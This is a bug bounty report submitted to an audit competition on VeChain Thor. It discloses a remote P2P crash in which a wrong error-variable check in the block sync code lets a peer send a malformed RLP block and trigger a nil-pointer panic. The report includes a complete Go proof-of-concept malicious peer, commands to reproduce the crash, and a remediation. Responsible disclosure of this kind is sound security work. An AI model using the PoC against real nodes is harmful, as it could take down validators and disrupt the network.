# 56611 bc medium remote p2p crash during sync thor default configuration&#x20;

**Submitted on Oct 18th 2025 at 12:02:10 UTC by @notGoku for** [**Attackathon | VeChain Hayabusa Upgrade**](https://immunefi.com/audit-competition/vechain-hayabusa-upgrade-attackathon)

* **Report ID:** #56611
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/vechain/thor/compare/master...release/hayabusa>
* **Impacts:**
  * Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network

## Description

Greetings from notGoku, this is my first audit report. feedback appreciated. thanks

### Summary

Any external peer that can reach the node’s public P2P listener (default `0.0.0.0:11235`) can terminate a Thor validator/full node. During sync the attacker completes the standard handshake, replies to `MsgGetBlocksFromNumber` with an invalid RLP “block,” and the victim — running the default pipeline — ignores the decode failure, dereferences a nil header, and panics. No internal access, authentication bypass, or non-default flags are required.

### Impact

* Immediate process crash (panic) on every vulnerable validator/full node that receives the crafted response.
* Repeated exploitation causes sustained downtime; a coordinated attack can knock ≥30% of the network offline, matching the “Medium” scope category for shutdown of network processing nodes.

### Exploitability

* **Default exposure:** Thor listens on the public P2P socket (`11235` by default; configurable, e.g. `30305` in local tests). No mutual auth is performed.
* **Single malformed reply:** The offending condition is met by returning an empty RLP list (`0xc0`) as the first “block” in the batch; the handshake otherwise follows the normal protocol.

### Technical Root Cause

In `decodeAndWarmupBatches` (`comm/sync.go:116-125`): <https://github.com/vechain/thor/blob/release/hayabusa/comm/sync.go#L116-L125>

```go
if decodeErr := rlp.DecodeBytes(raw, &blk); err != nil {
    err = errors.Wrap(decodeErr, "invalid block")
    return
}
expectedNum := batch.startNum + uint32(i)
if blk.Header().Number() != expectedNum {
    ...
}
```

The `if` statement mistakenly checks the outer `err` variable instead of `decodeErr`. When `DecodeBytes` fails, `decodeErr` is non-nil but `err` retains its previous value, so execution continues and `blk.Header()` is nil. The subsequent `Header().Number()` dereference panics (`block/header.go:67`).

### Affected Code

* `comm/sync.go:110-145` – decode pipeline ignores the decode failure and immediately dereferences the nil header.
* `block/header.go:67` – `(*Header).Number()` triggering the panic when called on a nil receiver.

(<https://github.com/vechain/thor/blob/release/hayabusa/block/header.go#L64-L68>)

### Suggested Remediation

* Fix the conditional to check `decodeErr` and return early on decode failure:

```go
if decodeErr := rlp.DecodeBytes(raw, &blk); decodeErr != nil {
    err = errors.Wrap(decodeErr, "invalid block")
    return
}
```

* Add a defensive `if blk.Header() == nil { ... }` guard before dereferencing to prevent future nil-pointer panics.
* Optionally score or disconnect peers that return malformed payloads so they cannot grief sync repeatedly.

***

## Proof of Concept

Run the steps below to reproduce (build, run victim node, run attacker). A stepper is used for the sequential process.

{% stepper %}
{% step %}

### Build

Build Thor and the malicious peer.

```
make thor
go build -v -o bin/malpeer ./poc/malpeer
```

{% endstep %}

{% step %}

### Run victim node

Start a victim Thor node (example uses `30305` for the P2P port):

```
nohup bin/thor --network genesis/example.json --ata-dir ./tmpdata2 --nat none --p2p-port 30305 --verbosity 9 --api-addr 127.0.0.1:0 > victim.log 2>&1 &
```

{% endstep %}

{% step %}

### Launch malicious peer

Run the PoC malpeer to target the victim (timeout example 30s):

```
timeout 30 bin/malpeer -target "enode://29d624337414454050c1469dd8e5dfffc6b6d4940468ca5901f5f8ca77061fbb20878d1f913756243779e45c9dab6367cfee5f77c1d49920baadc149cbd1480c@127.0.0.1:30305" -genesis 0x00000000024f670dc47c30ca787ae23e458e8e257a9d7017474efe88ee5940dc > attacker.log 2>&1
```

{% endstep %}

{% step %}

### Observe crash

Check `victim.log` for a panic. Example panic excerpt:

```
panic: runtime error: invalid memory address or nil pointer dereference
...
github.com/vechain/thor/v2/comm.decodeAndWarmupBatches.func1
  /home/.../comm/sync.go:122
```

This confirms the crash triggered by the malformed block payload.
{% endstep %}
{% endstepper %}

### PoC source (malpeer)

Create folder `poc/malpeer` and save the following as `main.go`:

{% code title="poc/malpeer/main.go" %}

```go
package main

import (
    "flag"
    "log"
    "math"
    "time"

    "github.com/ethereum/go-ethereum/crypto"
    "github.com/ethereum/go-ethereum/p2p"
    "github.com/ethereum/go-ethereum/p2p/discover"
    "github.com/ethereum/go-ethereum/rlp"

    "github.com/vechain/thor/v2/comm/proto"
    "github.com/vechain/thor/v2/p2psrv/rpc"
    "github.com/vechain/thor/v2/thor"
)

func main() {
    var (
        targetEnode = flag.String("target", "", "victim enode URL (enode://PUBKEY@IP:11235)")
        genesisHex  = flag.String("genesis", "", "victim genesis id hex (0x...)")
    )
    flag.Parse()
    if *targetEnode == "" || *genesisHex == "" {
        log.Fatalf("usage: malpeer -target enode://PUBKEY@HOST:11235 -genesis 0x...")
    }
    genesisID, err := thor.ParseBytes32(*genesisHex)
    if err != nil {
        log.Fatalf("parse genesis id: %v", err)
    }

    key, _ := crypto.GenerateKey()
    cfg := p2p.Config{
        PrivateKey:  key,
        Name:        "thor-malpeer",
        MaxPeers:    10,
        NoDiscovery: true,
        ListenAddr:  "0.0.0.0:0",
    }

    server := &p2p.Server{Config: cfg}
    server.Protocols = []p2p.Protocol{
        {
            Name:    proto.Name,
            Version: proto.Version,
            Length:  proto.Length,
            Run: func(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
                r := rpc.New(peer, rw)
                log.Printf("connected to %v (inbound=%v)", peer, peer.Inbound())
                return r.Serve(func(msg *p2p.Msg, write func(any)) error {
                    switch msg.Code {
                    case proto.MsgGetStatus:
                        if err := msg.Decode(&struct{}{}); err != nil { return err }
                        write(&proto.Status{
                            GenesisBlockID: genesisID,
                            SysTimestamp:   uint64(time.Now().Unix()),
                            TotalScore:     math.MaxUint64, // attract victim to sync from us
                            BestBlockID:    genesisID,       // non-zero
                        })
                    case proto.MsgGetBlockIDByNumber:
                        var _num uint32
                        _ = msg.Decode(&_num)
                        write(thor.Bytes32{}) // report no overlap, push ancestor seek to zero
                    case proto.MsgGetBlocksFromNumber:
                        var _from uint32
                        _ = msg.Decode(&_from)
                        // invalid RLP payload for a block (empty list) to trigger decode error path
                        bad := rlp.RawValue{0xc0}
                        write([]rlp.RawValue{bad})
                    case proto.MsgGetTxs:
                        if err := msg.Decode(&struct{}{}); err != nil { return err }
                        write([]rlp.RawValue{})
                    default:
                        // ignore
                    }
                    return nil
                }, proto.MaxMsgSize)
            },
        },
    }

    if err := server.Start(); err != nil {
        log.Fatalf("start malpeer: %v", err)
    }
    defer server.Stop()

    if self := server.Self(); self != nil {
        log.Printf("malpeer enode: %s", self.String())
    }

    node, err := discover.ParseNode(*targetEnode)
    if err != nil {
        log.Fatalf("parse target enode: %v", err)
    }
    log.Printf("dialing victim %s ...", node)
    server.AddPeer(node)

    select {}
}
```

{% endcode %}

### PoC files and logs

<details>

<summary>Victim log (example with crash)</summary>

<https://drive.google.com/file/d/1erHZCk8bXdngdBJCHDFG3bhJj9cqEesH/view?usp=drive\\_link>

</details>

<details>

<summary>Attacker log</summary>

<https://drive.google.com/file/d/15kW6OprSbuB\\_k1YVS9vk1uM2aespKOcD/view?usp=sharing>

</details>

<details>

<summary>Combined PoC archive</summary>

<https://drive.google.com/file/d/1A\\_JbfCTiZMpziTFk3nhihxlJdO9aNPDK/view?usp=sharing>

</details>

***

If you want, I can:

* produce a minimal patch diff for the suggested remediation,
* or convert the suggested defensive checks into a small test that reproduces the nil-header panic.
